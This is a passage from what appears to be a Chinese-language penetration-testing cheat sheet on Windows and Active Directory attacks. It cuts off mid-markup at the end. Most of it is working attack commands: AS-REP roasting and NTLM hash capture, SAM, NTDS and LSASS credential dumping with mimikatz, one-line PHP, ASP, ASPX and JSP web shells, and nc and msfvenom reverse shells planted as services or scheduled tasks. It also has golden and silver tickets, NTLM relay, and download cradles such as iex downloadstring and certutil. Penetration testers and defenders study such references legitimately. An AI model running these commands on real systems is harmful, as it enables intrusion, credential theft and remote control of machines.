Kerberos for these accounts.<br /><a href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting">https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting</a></p></blockquote><ul><li>Username requiured</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/<span class="variable">$username</span>:<span class="variable">$password</span> -request -outfile tgt</span><br><span class="line">python GetNPUsers.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/ -usersfile <span class="variable">$user_file</span> -request -outfile tgt</span><br><span class="line">hashcat -m 18200 tgt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><h3 id="获取运行程序-服务用户凭证"><a class="markdownIt-Anchor" href="#获取运行程序-服务用户凭证"></a> 获取运行程序、服务用户凭证</h3><p>监听</p><ul><li>responder</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0 -A</span><br></pre></td></tr></table></figure><ul><li>smbserver</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py -ip 10.10.*.* -smb2support BFL &#x2F;tmp</span><br></pre></td></tr></table></figure><ul><li>rogue ldap server</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd</span><br><span class="line">sudo dpkg-reconfigure -p low slapd</span><br><span class="line">echo -e &quot;#olcSaslSecProps.ldif\ndn: cn&#x3D;config\nreplace: olcSaslSecProps\nolcSaslSecProps: noanonymous,minssf&#x3D;0,passcred&quot; &gt; olcSaslSecProps.ldif</span><br><span class="line">sudo ldapmodify -Y EXTERNAL -H ldapi:&#x2F;&#x2F; -f .&#x2F;olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart</span><br><span class="line">ldapsearch -H ldap:&#x2F;&#x2F; -x -LLL -s base -b &quot;&quot; supportedSASLMechanisms</span><br><span class="line">sudo tcpdump -SX -i breachad tcp port 389</span><br></pre></td></tr></table></figure><p>服务</p><ul><li>Invoke-WebRequest</li></ul><p>访问域中web*域名80端口</p><figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Check web server status. Scheduled to run every 5min</span></span><br><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$record</span> <span class="keyword">in</span> <span class="built_in">Get-ChildItem</span> <span class="string">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> | <span class="built_in">Where-Object</span> Name <span class="operator">-like</span> <span class="string">&quot;web*&quot;</span>)  &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$request</span> = <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://<span class="variable">$</span>(<span class="variable">$record</span>.Name)&quot;</span> <span class="literal">-UseDefaultCredentials</span></span><br><span class="line"><span class="keyword">if</span>(.StatusCode <span class="operator">-ne</span> <span class="number">200</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Send-MailMessage</span> <span class="literal">-From</span> <span class="string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="literal">-To</span> <span class="string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> <span class="literal">-Subject</span> <span class="string">&quot;Host: <span class="variable">$</span>(<span class="variable">$record</span>.Name) is down&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;dirkjanm&#x2F;krbrelayx&#x2F;master&#x2F;dnstool.py</span><br><span class="line">python3 dnstool.py -u &quot;intelligence.htb\Tiffany.Molina&quot; -p NewIntelligenceCorpUser9876 --action add -r webbufferfly.intelligence.htb -d 10.10.*.* 10.10.10.248</span><br></pre></td></tr></table></figure><ul><li>MSSQL</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py PublicUser:GuestUserCantWrite1@10.10.11.202</span><br><span class="line"><span class="built_in">exec</span> master.dbo.xp_dirtree <span class="string">&#x27;\\10.10.*.*\BFL&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>RFI</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [2] include(/header.inc): failed to open stream: No such file or directory On line 36 in file C:\inetpub\wwwroot\functions.php</span></span><br><span class="line"><span class="comment">// Following function securely includes a file. Whenever we </span></span><br><span class="line"><span class="comment">// will encounter a PHP tag we will just bail out here. </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">secure_include</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line"><span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">http_response_code(<span class="number">403</span>); </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Forbidden - Tampering attempt detected.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=//10.10.*.*&amp;h=b1a3d9ecf02d4854f3a730f8b2a9af5d</span><br></pre></td></tr></table></figure><ul><li>desktop.ini</li></ul><blockquote><p><a href="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini">https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[.ShellClassInfo]</span><br><span class="line">IconResource&#x3D;\\10.10.*.*\BFL</span><br></pre></td></tr></table></figure><p>爆破NTLMv2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><h3 id="windows-credential-manager"><a class="markdownIt-Anchor" href="#windows-credential-manager"></a> Windows Credential Manager</h3><ul><li>Web Credential</li></ul><blockquote><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WebCredentials.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WebCredentials.ps1</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vaultcmd &#x2F;list</span><br><span class="line">vaultcmd &#x2F;listproperties:&quot;Web Credentials&quot;</span><br><span class="line">vaultcmd &#x2F;listcreds:&quot;Web Credemtials&quot;</span><br><span class="line">. .\Get-WebCredentials.ps1</span><br><span class="line">Get-WebCredentials</span><br></pre></td></tr></table></figure><ul><li>Windows Credential</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdkey &#x2F;list</span><br><span class="line">runas &#x2F;savecred &#x2F;user:$user cmd.exe</span><br></pre></td></tr></table></figure><ul><li>mimikatz</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::credman</span><br></pre></td></tr></table></figure><h3 id="laps"><a class="markdownIt-Anchor" href="#laps"></a> LAPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir &quot;c:\program files\laps\admpwd.dll&quot;</span><br><span class="line">find-admpwdextendedrights -identity *</span><br><span class="line">get-admpwdpassword -computername *</span><br></pre></td></tr></table></figure><h3 id="sam"><a class="markdownIt-Anchor" href="#sam"></a> SAM</h3><ul><li>SAM <code>c:\windows\system32\config\system</code></li><li>SYSTEM <code>c:\windows\system32\config\sam</code></li><li>Meterpreter<ul><li>hashdump</li></ul></li><li>Volume Shadow Copy</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 卷影拷贝时，拷贝操作需要在cmd中进行而不是powershell</span><br><span class="line">wmic shadowcopy call create volume&#x3D;&quot;c:\&quot;</span><br><span class="line">vssadmin list shadows</span><br><span class="line">copy \\?\globalroot\device\harddiskvolumeshadowcopy1\windows\system32\config\sam .\sam</span><br><span class="line">copy \\?\globalroot\device\harddiskvolumeshadowcopy1\windows\system32\config\system .\system</span><br></pre></td></tr></table></figure><ul><li>Registry</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam .\sam</span><br><span class="line">reg save hklm\system .\system</span><br><span class="line">reg save hklm\security .\security</span><br></pre></td></tr></table></figure><ul><li><code>python secretsdump.py local -system /tmp/SYSTEM -sam /tmp/SAM</code></li></ul><h3 id="ntdsdit"><a class="markdownIt-Anchor" href="#ntdsdit"></a> NTDS.DIT</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ntds</span><br><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full .\ntds&quot; q q</span><br></pre></td></tr></table></figure><h3 id="lsass"><a class="markdownIt-Anchor" href="#lsass"></a> LSASS</h3><ul><li>Memory Dump<ul><li>taskmgr</li><li>mimikatz</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><ul><li>Protected LSASS<ul><li>reg</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa &#x2F;f RunAsPPL</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa &#x2F;v RunAsPPL &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure><ul><li>mimikatz<br />(mimidrv.sys)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!+</span><br><span class="line">!processprotect &#x2F;process:lsass.exe &#x2F;remove</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><h2 id="getshell"><a class="markdownIt-Anchor" href="#getshell"></a> GetShell</h2><ul><li>考虑与Pass The Hash或Pass The Ticket结合</li><li>psexec<ul><li>ADMIN$路径写权限</li><li><code>impacket-psexec $domain/$username:$password@$ip</code></li></ul></li><li>evil-winrm<ul><li><code>evil-winrm -i $ip -u $username -p $password</code></li></ul></li><li>ssh</li><li>mssql</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py ARCHETYPE&#x2F;sql_svc@10.10.10.27  -windows-auth</span><br><span class="line">enable_xp_cmdshell</span><br><span class="line">xp_cmdshell whoami</span><br></pre></td></tr></table></figure><ul><li>wmiexec<ul><li><code>impacket-wmiexec $domain/$username:$password@$ip</code></li></ul></li><li>dcomexec<ul><li><code>impacket-dcomexec -object MMC20 $domain/$username:$password@$ip</code></li></ul></li><li>WebShell<ul><li>PHP: <code>&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;</code></li><li>PHP_Reverse_Shell: <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></li><li>PHP_Reverse_Shell_Generic: <a href="https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php">https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php</a></li><li>ASP: <code>&lt;%eval request(&quot;BFL&quot;)%&gt;</code></li><li>ASPX: <code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;BFL&quot;],&quot;unsafe&quot;);%&gt;</code></li><li>JSP: <code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;BFL&quot;));%&gt;</code></li></ul></li><li>PowerShellTCP<ul><li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a></li><li><code>Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.2 -Port 9999</code></li></ul></li><li>service<ul><li>runas用于生成带有目标用户令牌的Shell</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">runas &#x2F;netonly &#x2F;user:$domain\$username &quot;nc64.exe -e cmd.exe $hostname $port&quot;</span><br><span class="line">$password</span><br><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;$ip LPORT&#x3D;$port -f exe-service -o bfl.exe</span><br><span class="line">smbclient -c &quot;put bfl.exe&quot; -U $username -W $domain &quot;&#x2F;&#x2F;$ip&#x2F;admin$&#x2F;&quot; $password</span><br><span class="line">sc \\$ip create bflservice binpath&#x3D;&quot;c:\windows\bfl.exe&quot;</span><br><span class="line">sc \\$ip start bflservice</span><br></pre></td></tr></table></figure><ul><li>schtasks<ul><li>runas用于生成带有目标用户令牌的Shell</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">runas &#x2F;netonly &#x2F;user:$domain\$username &quot;nc64.exe -e cmd.exe $ip $port&quot;</span><br><span class="line">$password</span><br><span class="line">schtask &#x2F;s $ip &#x2F;ru &quot;system&quot; &#x2F;create &#x2F;tn &quot;bfltask&quot; &#x2F;tr &quot;nc.exe -e cmd.exe $ip $port&quot; &#x2F;sc once &#x2F;sd 01&#x2F;01&#x2F;1970 &#x2F;st 00:00</span><br><span class="line">schtasks &#x2F;s $ip &#x2F;run &#x2F;tn &quot;bfltask&quot;</span><br><span class="line">schtsaks &#x2F;s $ip &#x2F;run &#x2F;tn &quot;bfltask&quot;</span><br></pre></td></tr></table></figure><ul><li>VBS</li></ul><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;nc64.exe -e cmd.exe $ip $port&quot;</span>, <span class="number">0</span>, <span class="literal">True</span></span><br></pre></td></tr></table></figure><ul><li>RDP Hijacking</li></ul><blockquote><p>When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.<br />Windows Server 2019 won’t allow you to connect to another user’s session without knowing its password.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec64.exe -s cmd.exe</span><br><span class="line">query user</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> USERNAMESESSIONNAME   ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line">&gt;administrator rdp-tcp#6 2  Active.  4&#x2F;1&#x2F;2022 4:09 AM</span><br><span class="line"> luke3  Disc   .  4&#x2F;6&#x2F;2022 6:51 AM</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon 3 &#x2F;dest:rdp-tcp#6</span><br></pre></td></tr></table></figure><h2 id="tickets"><a class="markdownIt-Anchor" href="#tickets"></a> Tickets</h2><p>$sid为域sid</p><h3 id="golden-tickets"><a class="markdownIt-Anchor" href="#golden-tickets"></a> Golden Tickets</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;sid:$sid &#x2F;domain:$domain &#x2F;user:$username &#x2F;krbtgt:$krbtgt_ntlm &#x2F;ptt</span><br></pre></td></tr></table></figure><h3 id="silver-tickets"><a class="markdownIt-Anchor" href="#silver-tickets"></a> Silver Tickets</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;sid:$sid &#x2F;domain:$domain &#x2F;target:$hostname &#x2F;service:$service &#x2F;rc4:$ntlm &#x2F;user:$username &#x2F;ptt</span><br></pre></td></tr></table></figure><h2 id="unconstrained-delegation"><a class="markdownIt-Anchor" href="#unconstrained-delegation"></a> Unconstrained Delegation</h2><p><strong>TRUSTED_FOR_DELEGATION</strong></p><blockquote><p>In the background, if a user with the “TRUSTED_FOR_DELEGATION” flag set authenticates to a host with Unconstrained Delegation configured, a ticket-granting ticket (TGT) for that user account is generated and stored in memory so it can be used later if needed.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get-netcomputer -unconstrained</span><br><span class="line">rubeus klist</span><br><span class="line">rubeus dump</span><br><span class="line">rubeus ptt &#x2F;ticket:$ticket</span><br></pre></td></tr></table></figure><h2 id="constrained-delegation"><a class="markdownIt-Anchor" href="#constrained-delegation"></a> Constrained Delegation</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Recon&#x2F;PowerView.ps1 -O</span><br><span class="line">. .\PowerView.ps1</span><br><span class="line">get-netuser -trustedtoauth</span><br></pre></td></tr></table></figure><p><strong>msds-allowedtodelegateto</strong></p><p>mimikatz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::secrets</span><br></pre></td></tr></table></figure><p>kekeo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask &#x2F;user:$user &#x2F;domain:$domain &#x2F;password:$password</span><br><span class="line">tgs::s4u &#x2F;tgt:$tgt_file &#x2F;user:$user &#x2F;service:$service&#x2F;$hostname</span><br></pre></td></tr></table></figure><p>mimikatz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::ptt $tgs_file</span><br></pre></td></tr></table></figure><p>http + wsman -&gt; powershell remoting</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-PSSession -ComputerName $hostname</span><br><span class="line">Enter-PSSession -ComputerName $hostname</span><br></pre></td></tr></table></figure><h2 id="print-spooler-service-mitm"><a class="markdownIt-Anchor" href="#print-spooler-service-mitm"></a> Print Spooler Service MITM</h2><ul><li>一台机器对另一台机器有管理员权限</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gwmi win32_printer -computer $admin_ip</span><br><span class="line">get-printerport -computername $admin_ip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script&#x3D;smb2-security-mode $admin_ip $target_ip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python ntlmrelayx.py -smb2support -t smb:&#x2F;&#x2F;$target_ip -debug</span><br><span class="line">python ntlmrelayx.py -smb2support -t smb:&#x2F;&#x2F;$target_ip -debug -c &quot;whoami &#x2F;all&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spoolsample.exe $admin_ip $mitm_ip</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p></blockquote><h2 id="注册表"><a class="markdownIt-Anchor" href="#注册表"></a> 注册表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query hklm &#x2F;f password &#x2F;t reg_sz &#x2F;s</span><br><span class="line">reg query hkcu &#x2F;f password &#x2F;t reg_sz &#x2F;s</span><br></pre></td></tr></table></figure><h2 id="路径"><a class="markdownIt-Anchor" href="#路径"></a> 路径</h2><ul><li>powershell history: <code>&quot;c:\users\$user\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt&quot;</code></li><li>redif conf: <code>&quot;c:\program files\redis\redis.windows.conf&quot;</code></li><li>mssql conf: <code>&quot;c:\program files\microsoft sql server\&quot;</code></li><li>mRemoteNG: <code>c:\users\$user\appdata\roaming\mremoteng\confcons.xml</code></li><li>WEB &amp; SMB &amp; FTP</li><li>firefox: <code>c:\users\$user\appdata\roaming\mozilla</code><ul><li><a href="https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py">https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py</a></li></ul></li><li>MCAFEE: <code>c:\programdata\mcafee\agent\db\ma.db</code></li><li>APPLocker: <code>c:\windows\system32\spool\drivers\color\</code></li></ul><h2 id="文件传输-2"><a class="markdownIt-Anchor" href="#文件传输-2"></a> 文件传输</h2><ul><li>Server<ul><li>smb</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py Bufferfly . -smb2support -username Buffer -password fly &amp;</span><br></pre></td></tr></table></figure><ul><li>http</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80 &amp;</span><br></pre></td></tr></table></figure></li><li>client<ul><li>curl</li><li>wget</li><li><code>iex(new-object net.webclient).downloadstring(&quot;http://10.10.*.*/PowerView.ps1&quot;)</code></li><li><code>$WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile(&quot;http://10.4.23.166/JuicyPotato.exe&quot;, &quot;C:\users\bruce\desktop\juicy.exe&quot;)</code></li><li><code>iwr -uri http://192.168.45.187/winPEASany.exe -outfile winPEASany.exe</code></li><li><code>certutil -urlcache -split -f http://10.50.98.5:8888/bfl.exe</code></li><li>smb<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.*.*\Bufferfly &#x2F;u:Buffer fly</span><br><span class="line">copy test \\10.10.*.*</span><br><span class="line">net use &#x2F;d \\10.10.*.*\Bufferfly</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="端口转发"><a class="markdownIt-Anchor" href="#端口转发"></a> 端口转发</h2><ul><li>lcx<ul><li><a href="https://github.com/windworst/LCX">https://github.com/windworst/LCX</a></li><li><a href="https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe">https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe</a></li></ul></li><li>chisel<ul><li><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></li></ul></li><li>earthworm<ul><li><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></li></ul></li><li>sshuttle<ul><li><a href="https://github.com/sshuttle/sshuttle">https://github.com/sshuttle/sshuttle</a></li></ul></li><li>netsh</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport&#x3D;2222 listenaddress&#x3D;0.0.0.0 connectport&#x3D;22 connectaddress&#x3D;10.4.204.215</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;port_forward_2222&quot; protocol&#x3D;TCP dir&#x3D;in localip&#x3D;0.0.0.0 localport&#x3D;2222 action&#x3D;allow</span><br></pre></td></tr></table></figure><h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> EXP</h3><ul><li><a href="https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213">https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213</a></li><li><a href="https://github.com/jas502n/CVE-2019-1388">https://github.com/jas502n/CVE-2019-1388</a></li></ul><h3 id="runascs"><a class="markdownIt-Anchor" href="#runascs"></a> runascs</h3><blockquote><p><a href="https://github.com/antonioCoco/RunasCs/">https://github.com/antonioCoco/RunasCs/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runascs c.bum Tikkycoll_431012284 powershell -r 10.10.*.*:9998</span><br></pre></td></tr></table></figure><h3 id="overpass-the-hash"><a class="markdownIt-Anchor" href="#overpass-the-hash"></a> Overpass The Hash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;domain:$domain &#x2F;user:$username &#x2F;ntlm:$ntlm &#x2F;run:powershell</span><br></pre></td></tr></table></figure><h3 id="printnightmare"><a class="markdownIt-Anchor" href="#printnightmare"></a> PrintNightmare</h3><blockquote><p><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a><br /><a href="https://github.com/m8sec/CVE-2021-34527">https://github.com/m8sec/CVE-2021-34527</a></p></blockquote><h3 id="alwaysinstallelevated"><a class="markdownIt-Anchor" href="#alwaysinstallelevated"></a> alwaysinstallelevated</h3><blockquote><p>找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。<br /><a href="https://zhuanlan.zhihu.com/p/375373404">https://zhuanlan.zhihu.com/p/375373404</a></p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">AlwaysInstallElevated   REG_DWORD   <span class="number">0</span>x1</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td 